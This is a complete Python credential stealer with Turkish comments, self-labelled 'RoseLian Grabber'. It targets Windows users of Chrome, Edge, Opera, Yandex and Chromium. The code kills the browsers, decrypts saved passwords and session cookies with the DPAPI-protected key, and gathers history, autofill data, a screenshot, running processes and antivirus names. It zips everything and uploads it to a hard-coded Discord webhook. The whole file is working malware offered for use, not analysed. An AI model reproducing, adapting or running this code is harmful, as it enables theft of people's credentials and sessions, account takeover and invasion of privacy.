import os
import json
import base64
import sqlite3
import shutil
import zipfile
import tempfile
import requests
import pyautogui
import psutil
import signal
import winreg
from win32crypt import CryptUnprotectData
from Crypto.Cipher import AES
from datetime import datetime



browsers = [
    'opera.exe',
    'opera_gx.exe',
    'chrome.exe',
    'msedge.exe',
    'yandex.exe',
    'chromium.exe'
]

# Her tarayıcı süreci için
for browser in browsers:
    for proc in psutil.process_iter(['pid', 'name']):
        if proc.info['name'] and browser.lower() in proc.info['name'].lower():
            try:
                os.kill(proc.info['pid'], signal.SIGTERM)  # Süreci sonlandır
                print(f"{proc.info['name']} (PID: {proc.info['pid']}) sonlandırıldı.")
            except Exception as e:
                print(f"{proc.info['name']} (PID: {proc.info['pid']}) sonlandırılamadı: {e}")

# Local State'i bul tarayıcı ile ilgili veriler burda saklanıyo cünkü ŞİFRELERİ ÇÖZME ANAHTARINI BURDAN ALACAGIZ

def find_local_state(browser_name):
    paths = {
        'chrome': os.path.join(os.environ['USERPROFILE'], r'AppData\Local\Google\Chrome\User Data\Local State'),
        'opera': os.path.join(os.environ['USERPROFILE'], r'AppData\Roaming\Opera Software\Opera Stable\Local State'),
        'opera_gx': os.path.join(os.environ['USERPROFILE'], r'AppData\Roaming\Opera Software\Opera GX Stable\Local State'),
        'yandex': os.path.join(os.environ['USERPROFILE'], r'AppData\Local\Yandex\YandexBrowser\User Data\Local State'),
        'chromium': os.path.join(os.environ['USERPROFILE'], r'AppData\Local\Chromium\User Data\Local State'),
        'edge': os.path.join(os.environ['USERPROFILE'], r'AppData\Local\Microsoft\Edge\User Data\Local State'),
    }
    return paths.get(browser_name.lower())


# Şifrelenen verileri çözmek icin özel anahtarı al
def get_secret_key(local_state_path):
    with open(local_state_path, 'r', encoding='utf-8') as file:
        local_state = json.loads(file.read())
    encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
    encrypted_key = encrypted_key[5:]  # Remove 'DPAPI' prefix
    secret_key = CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    return secret_key

# Sifreleri çöz

def decrypt_password(buff, secret_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(secret_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)[:-16].decode()
        return decrypted_pass
    except Exception as e:
        print(f"Failed to decrypt password: {e}")
        return ""

# Tarayıcı şifrelerini cek

def get_browser_passwords(browser_name, secret_key):
    data_paths = {
        'chrome': os.path.join(os.environ['USERPROFILE'], r'AppData\Local\Google\Chrome\User Data\Default'),
        'opera': os.path.join(os.environ['USERPROFILE'], r'AppData\Roaming\Opera Software\Opera Stable'),
        'opera_gx': os.path.join(os.environ['USERPROFILE'], r'AppData\Roaming\Opera Software\Opera GX Stable'),
        'yandex': os.path.join(os.environ['USERPROFILE'], r'AppData\Local\Yandex\YandexBrowser\User Data\Default'),
        'chromium': os.path.join(os.environ['USERPROFILE'], r'AppData\Local\Chromium\User Data\Default'),
        'edge': os.path.join(os.environ['USERPROFILE'], r'AppData\Local\Microsoft\Edge\User Data\Default'),
    }
    data_path = data_paths.get(browser_name.lower())
    login_db = os.path.join(data_path, 'Login Data')

    if not os.path.exists(login_db):
        print(f"{browser_name} Login Data file not found.")
        return []

    temp_db = os.path.join(tempfile.gettempdir(), 'Login Data')
    shutil.copyfile(login_db, temp_db)

    conn = sqlite3.connect(temp_db)
    cursor = conn.cursor()
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    data = cursor.fetchall()

    passwords = []
    for url, username, encrypted_password in data:
        decrypted_password = decrypt_password(encrypted_password, secret_key)
        if decrypted_password:
            passwords.append({'url': url, 'username': username, 'password': decrypted_password})
        else:
            print(f"Failed to decrypt {url}")

    cursor.close()
    conn.close()
    os.remove(temp_db)

    return passwords


# TARAYICI GECMİSLERİNİ CEKİYORUZ BU KODDA


def get_browser_history(browser_name):
    data_paths = {
        'chrome': os.path.join(os.environ['USERPROFILE'], r'AppData\Local\Google\Chrome\User Data\Default'),
        'opera': os.path.join(os.environ['USERPROFILE'], r'AppData\Roaming\Opera Software\Opera Stable'),
        'opera_gx': os.path.join(os.environ['USERPROFILE'], r'AppData\Roaming\Opera Software\Opera GX Stable'),
        'yandex': os.path.join(os.environ['USERPROFILE'], r'AppData\Local\Yandex\YandexBrowser\User Data\Default'),
        'chromium': os.path.join(os.environ['USERPROFILE'], r'AppData\Local\Chromium\User Data\Default'),
        'edge': os.path.join(os.environ['USERPROFILE'], r'AppData\Local\Microsoft\Edge\User Data\Default'),
    }
    data_path = data_paths.get(browser_name.lower())
    history_db = os.path.join(data_path, 'History')

    if not os.path.exists(history_db):
        print(f"{browser_name} History file not found.")
        return []

    temp_db = os.path.join(tempfile.gettempdir(), 'History')
    shutil.copyfile(history_db, temp_db)

    conn = sqlite3.connect(temp_db)
    cursor = conn.cursor()
    cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls") # Ziyaret edilen site ve en son ziyaret edilme zamanı gibi bilgileri toplar
    data = cursor.fetchall()

    history = []
    for url, title, visit_count, last_visit_time in data:
        timestamp = last_visit_time / 1000000 - 11644473600  # Convert from Windows file time to Unix time
        visit_time = datetime.utcfromtimestamp(timestamp).strftime('%Y-%m-%d %H:%M:%S')
        history.append({'url': url, 'title': title, 'visit_count': visit_count, 'last_visit_time': visit_time})

    cursor.close()
    conn.close()
    os.remove(temp_db)

    return history


# Otomatik doldurma bilgilerini toplar
def get_autofill_data(browser_name):
    data_paths = {
        'chrome': os.path.join(os.environ['USERPROFILE'], r'AppData\Local\Google\Chrome\User Data\Default'),
        'opera': os.path.join(os.environ['USERPROFILE'], r'AppData\Roaming\Opera Software\Opera Stable'),
        'opera_gx': os.path.join(os.environ['USERPROFILE'], r'AppData\Roaming\Opera Software\Opera GX Stable'),
        'yandex': os.path.join(os.environ['USERPROFILE'], r'AppData\Local\Yandex\YandexBrowser\User Data\Default'),
        'chromium': os.path.join(os.environ['USERPROFILE'], r'AppData\Local\Chromium\User Data\Default'),
        'edge': os.path.join(os.environ['USERPROFILE'], r'AppData\Local\Microsoft\Edge\User Data\Default'),
    }
    data_path = data_paths.get(browser_name.lower())
    autofill_db = os.path.join(data_path, 'Web Data')

    if not os.path.exists(autofill_db):
        print(f"{browser_name} Web Data file not found.")
        return []

    temp_db = os.path.join(tempfile.gettempdir(), 'Web Data')
    shutil.copyfile(autofill_db, temp_db)

    conn = sqlite3.connect(temp_db)
    cursor = conn.cursor()
    cursor.execute("SELECT name, value FROM autofill")
    data = cursor.fetchall()

    autofill = []
    for name, value in data:
        autofill.append({'name': name, 'value': value})

    cursor.close()
    conn.close()
    os.remove(temp_db)

    return autofill


# Session id topluyoruz burada <3


def get_cookies(browser_name, secret_key):
    data_paths = {
        'chrome': os.path.join(os.environ['USERPROFILE'], r'AppData\Local\Google\Chrome\User Data\Default\Network'),
        'opera': os.path.join(os.environ['USERPROFILE'], r'AppData\Roaming\Opera Software\Opera Stable'),
        'opera_gx': os.path.join(os.environ['USERPROFILE'], r'AppData\Roaming\Opera Software\Opera GX Stable\Network'),
        'yandex': os.path.join(os.environ['USERPROFILE'], r'AppData\Local\Yandex\YandexBrowser\User Data\Default\Network'),
        'chromium': os.path.join(os.environ['USERPROFILE'], r'AppData\Local\Chromium\User Data\Default\Network'),
        'edge': os.path.join(os.environ['USERPROFILE'], r'AppData\Local\Microsoft\Edge\User Data\Default\Network'),
    }
    data_path = data_paths.get(browser_name.lower())
    cookies_db = os.path.join(data_path, 'Cookies')

    if not os.path.exists(cookies_db):
        print(f"{browser_name} Cookies file not found.")
        return []

    temp_db = os.path.join(tempfile.gettempdir(), 'Cookies')
    shutil.copyfile(cookies_db, temp_db)

    conn = sqlite3.connect(temp_db)
    cursor = conn.cursor()
    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
    data = cursor.fetchall()

    cookies = []
    for host_key, name, encrypted_value in data:
        decrypted_value = decrypt_password(encrypted_value, secret_key)
        if decrypted_value:
            cookies.append({'host_key': host_key, 'name': name, 'value': decrypted_value})
        else:
            print(f"Failed to decrypt cookie for {host_key}")

    cursor.close()
    conn.close()
    os.remove(temp_db)

    return cookies



# Arka planda açık kalan işlemleri toplar
def get_open_processes():
    processes = []
    for proc in psutil.process_iter(['pid', 'name']):
        processes.append(f"{proc.info['name']} (PID: {proc.info['pid']})")
    return processes


# Bilgisayarda yüklü olan antivirüsleri çeker şimdilik windows defenderi algılıyor sadece ileride güncellerim.
def get_installed_antivirus():
    antivirus_list = []
    try:
        reg_paths = [
            r"SOFTWARE\Microsoft\Windows Defender",
            r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
            r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
        ]
        
        for path in reg_paths:
            try:
                with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, path) as key:
                    i = 0
                    while True:
                        try:
                            subkey_name = winreg.EnumKey(key, i)
                            with winreg.OpenKey(key, subkey_name) as subkey:
                                try:
                                    display_name = winreg.QueryValueEx(subkey, "DisplayName")[0]
                                    if 'antivirus' in display_name.lower():
                                        antivirus_list.append(display_name)
                                except FileNotFoundError:
                                    pass
                            i += 1
                        except OSError:
                            break
            except FileNotFoundError:
                continue
    except Exception as e:
        print(f"Error getting antivirus list: {e}")

    return antivirus_list



# Bir zip oluştur ve içine yukarıda toplanan verileri koy
def create_zip_file(browser_data, antivirus_list, open_processes):
    zip_filename = os.path.join(tempfile.gettempdir(), 'browser_data.zip')
    with zipfile.ZipFile(zip_filename, 'w') as zipf:
        for browser_name, data in browser_data.items():
            folder_path = os.path.join(tempfile.gettempdir(), browser_name)
            os.makedirs(folder_path, exist_ok=True)

            # Write passwords
            with open(os.path.join(folder_path, 'passwords.txt'), 'w', encoding='utf-8') as f:
                for item in data.get('passwords', []):
                    f.write(f"URL: {item['url']}\nUsername: {item['username']}\nPassword: {item['password']}\n\n")

            # Write history
            with open(os.path.join(folder_path, 'history.txt'), 'w', encoding='utf-8') as f:
                for item in data.get('history', []):
                    f.write(f"URL: {item['url']}\nTitle: {item['title']}\nVisit Count: {item['visit_count']}\nLast Visit Time: {item['last_visit_time']}\n\n")

            # Write autofill
            with open(os.path.join(folder_path, 'autofill.txt'), 'w', encoding='utf-8') as f:
                for item in data.get('autofill', []):
                    f.write(f"Name: {item['name']}\nValue: {item['value']}\n\n")

            # Write cookies
            with open(os.path.join(folder_path, 'cookies.txt'), 'w', encoding='utf-8') as f:
                for item in data.get('cookies', []):
                    f.write(f"Host: {item['host_key']}\nName: {item['name']}\nValue: {item['value']}\n\n")

            # Add to zip
            for root, dirs, files in os.walk(folder_path):
                for file in files:
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, tempfile.gettempdir())
                    zipf.write(file_path, arcname=arcname)

            # Toplamadan sonra temizlik yapar.
            shutil.rmtree(folder_path)

        
        screenshot_path = take_screenshot()
        zipf.write(screenshot_path, 'screenshot.png')
        os.remove(screenshot_path)

      
        antivirus_info_path = os.path.join(tempfile.gettempdir(), 'antivirus_info.txt')
        with open(antivirus_info_path, 'w', encoding='utf-8') as f:
            f.write("Installed Antivirus Programs:\n")
            for antivirus in antivirus_list:
                f.write(f"{antivirus}\n")
        
        zipf.write(antivirus_info_path, 'antivirus_info.txt')
        os.remove(antivirus_info_path)

        
        open_processes_path = os.path.join(tempfile.gettempdir(), 'open_processes.txt')
        with open(open_processes_path, 'w', encoding='utf-8') as f:
            f.write("Open Processes:\n")
            for process in open_processes:
                f.write(f"{process}\n")
        
        zipf.write(open_processes_path, 'open_processes.txt')
        os.remove(open_processes_path)

    return zip_filename

def create_summary_message(browser_data, antivirus_list):
    total_passwords = sum(len(data.get('passwords', [])) for data in browser_data.values())
    total_cookies = sum(len(data.get('cookies', [])) for data in browser_data.values())
    total_sites_visited = sum(len(data.get('history', [])) for data in browser_data.values())
    total_autofill = sum(len(data.get('autofill', [])) for data in browser_data.values())

    message = f"""
    **Browser Data Summary**
    
    **Passwords**: {total_passwords}
    **Cookies**: {total_cookies}
    **Sites Visited**: {total_sites_visited}
    **Autofill Entries**: {total_autofill}

    **Installed Antivirus Programs**: {len(antivirus_list)}
    """
    
    if antivirus_list:
        message += "\n" + "\n".join(antivirus_list)

    return message

def take_screenshot():
    screenshot = pyautogui.screenshot()
    screenshot_path = os.path.join(tempfile.gettempdir(), 'screenshot.png')
    screenshot.save(screenshot_path)
    return screenshot_path

def send_to_discord(zip_filename, summary_message, webhook_url):
    
    files = {
        'file': ('browser_data.zip', open(zip_filename, 'rb'))
    }

    
    payload = {
        'username': 'RoseLian Grabber - Made by shadowscript1337',
        'content': summary_message
    }
    
    try:
        
        response = requests.post(webhook_url, data=payload, files=files)
        if response.status_code == 204:
            print("Data successfully sent to Discord.")
        else:
            print(f"Failed to send data to Discord. Status code: {response.status_code}")
            print(f"Response text: {response.text}")
    except Exception as e:
        print(f"An error occurred while sending data to Discord: {e}")

def main():
    webhook_url = 'https://discord.com/api/webhooks/1266882704222195773/ff-j0XWeidPALoJkWwF6kATiKTLF2wFCVRDU1sLQ1lH-dxQD1kRoxu8VnPGbSM_Wds5o'

    all_data = {}
    browsers = ['chrome', 'opera', 'opera_gx', 'yandex', 'chromium', 'edge']

    for browser in browsers:
        local_state_path = find_local_state(browser)
        if local_state_path and os.path.exists(local_state_path):
            try:
                secret_key = get_secret_key(local_state_path)
                data = {
                    'passwords': get_browser_passwords(browser, secret_key),
                    'history': get_browser_history(browser),
                    'autofill': get_autofill_data(browser),
                    'cookies': get_cookies(browser, secret_key),
                }
                all_data[browser] = data
            except Exception as e:
                print(f"Error retrieving data for {browser}: {e}")

    antivirus_list = get_installed_antivirus()
    open_processes = get_open_processes()

    zip_filename = create_zip_file(all_data, antivirus_list, open_processes)
    summary_message = create_summary_message(all_data, antivirus_list)

    send_to_discord(zip_filename, summary_message, webhook_url)

if __name__ == "__main__":
    main()
